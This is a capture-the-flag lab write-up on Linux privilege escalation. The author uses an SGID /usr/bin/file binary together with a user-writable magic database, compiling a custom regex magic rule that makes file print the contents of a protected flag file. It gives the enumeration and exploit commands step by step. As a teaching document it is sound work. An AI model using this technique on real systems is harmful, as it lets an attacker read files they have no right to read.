# Privilege Escalation Lab 2

## Overview

This lab focused on Linux privilege escalation through a subtle **SGID misconfiguration**.

The objective was to escalate access from a low-privileged `user` account and retrieve a protected flag.

**Difficulty:** Medium
**Category:** Linux Privilege Escalation
**Initial Access:** SSH credentials provided by the lab
**Target:** `172.31.45.248:30503`

---

## Objective

Escalate privileges from the low-privileged `user` account and retrieve the hidden flag.

---

## Initial Enumeration

After connecting to the machine, I checked the current user's privileges:

```bash
id
```

Output:

```text
uid=1001(user) gid=1001(user) groups=1001(user)
```

The user was not a member of any privileged groups.

I then enumerated SUID and SGID binaries:

```bash
find / -type f \( -perm -2000 -o -perm -4000 \) -exec ls -la {} \; 2>/dev/null
```

Among the results, one unusual binary stood out:

```text
-rwxr-sr-x. 1 root ctf 27104 Jan 16 2020 /usr/bin/file
```

The `/usr/bin/file` binary had the **SGID bit set** and belonged to the custom `ctf` group.

---

## Identifying the Misconfiguration

I checked the `ctf` group:

```bash
getent group ctf
```

Output:

```text
ctf:x:1000:
```

The current user was not a member of the group.

Next, I searched for files belonging to the `ctf` group:

```bash
find / -group ctf -ls 2>/dev/null
```

This revealed:

```text
-rw-r--r-- 1 user ctf 344 ... /home/user/magic.mgc
```

This was the critical finding.

The situation was:

| Resource               | Owner | Group | Important Permission |
| ---------------------- | ----- | ----- | -------------------- |
| `/usr/bin/file`        | root  | ctf   | SGID                 |
| `/home/user/magic.mgc` | user  | ctf   | Writable by user     |
| `/home/ctf/flag`       | ctf   | ctf   | Readable by group    |

The `file` utility uses a **magic database** to determine the type/content of files.

Therefore, I had a user-controlled magic database that could be loaded by an SGID binary running with the `ctf` group.

---

## Exploitation

First, I backed up the original magic database:

```bash
cp /home/user/magic.mgc /home/user/magic.mgc.bak
```

I then created a custom magic rule:

```bash
cat > /home/user/readflag.magic <<'EOF'
0 regex .+ %s
EOF
```

The rule was designed to match the contents of the target file and print the matched data.

The magic database was compiled using:

```bash
file -C -m /home/user/readflag.magic
```

This generated:

```text
/home/user/readflag.magic.mgc
```

I moved the compiled database to the location controlled by the lab:

```bash
mv /home/user/readflag.magic.mgc /home/user/magic.mgc
```

The resulting file was:

```text
-rw-r--r--. 1 user ctf 688 ... /home/user/magic.mgc
```

---

## Reading the Protected File

The flag was owned by the `ctf` user and group:

```text
-r--r-----. 1 ctf ctf 30 ... /home/ctf/flag
```

The normal `user` account could not directly read it.

However, `/usr/bin/file` had SGID permissions:

```text
-rwxr-sr-x. 1 root ctf ... /usr/bin/file
```

I executed:

```bash
/usr/bin/file -m /home/user/magic.mgc /home/ctf/flag
```

The malicious magic rule caused `file` to disclose the contents:

```text
/home/ctf/flag: ctf{reading_unreadable_files}, ASCII text
```

---

## Flag

```text
ctf{reading_unreadable_files}
```

---

## Privilege Escalation Chain

```text
Low-privileged user
        │
        ▼
Enumerate SUID / SGID binaries
        │
        ▼
/usr/bin/file
SGID → ctf
        │
        ▼
User-controlled /home/user/magic.mgc
        │
        ▼
Create malicious magic rule
        │
        ▼
SGID file process reads protected file
        │
        ▼
/home/ctf/flag
        │
        ▼
ctf{reading_unreadable_files}
```

---

## Key Takeaways

* Always enumerate both **SUID and SGID binaries** during Linux privilege escalation.
* Custom groups such as `ctf` can be more interesting than standard groups like `shadow` or `tty`.
* A privileged binary is especially dangerous when it loads **user-controlled configuration or data files**.
* The SGID permission does not provide root directly; it provides the privileges of the file's group.
* Writable configuration files combined with privileged binaries can create an indirect privilege-escalation path.
* Automated enumeration tools can identify suspicious permissions, but understanding **how the binary uses the controlled file** is essential.

---

## Tools / Commands Used

```text
SSH
Linux enumeration
find
ls
id
getent
file
```

### Vulnerability Class

**Improper Privilege Management / SGID Misconfiguration**

### Impact

A low-privileged user could abuse the SGID `file` binary and its user-controlled magic database to access information protected by the `ctf` group.
